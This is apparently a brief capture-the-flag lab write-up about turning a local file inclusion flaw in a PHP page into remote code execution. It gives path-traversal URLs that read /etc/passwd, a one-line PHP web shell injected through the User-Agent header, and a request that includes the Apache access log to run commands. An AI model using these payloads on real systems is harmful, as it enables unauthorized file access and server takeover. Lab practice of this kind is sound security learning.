i was solving a lab where i find out a php file is been exicuted on a url 
```
http://mafialive.thm/test.php?view=mrrobot.txt

```
then i find aout about a lfo local file inclution where i can view other files of the system throughtdirectory swaping 
```
http://mafialive.thm/test.php?view=var/www/html/web../../../../../../../../../etc/passwd
```
and we got the passwd files

so now we can convert it to rce remote code exe
for that we need to alter the user agent 
```
<?php system($_GET[‘cmd’]);?>

So from now on whenever we access /var/log/apache2/access.log with GET parameter “cmd”, it’s value will be interpreted and we can have command execution. Let’s test this by running “whoami” command in the GET request:

GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=whoami HTTP/1.1
```
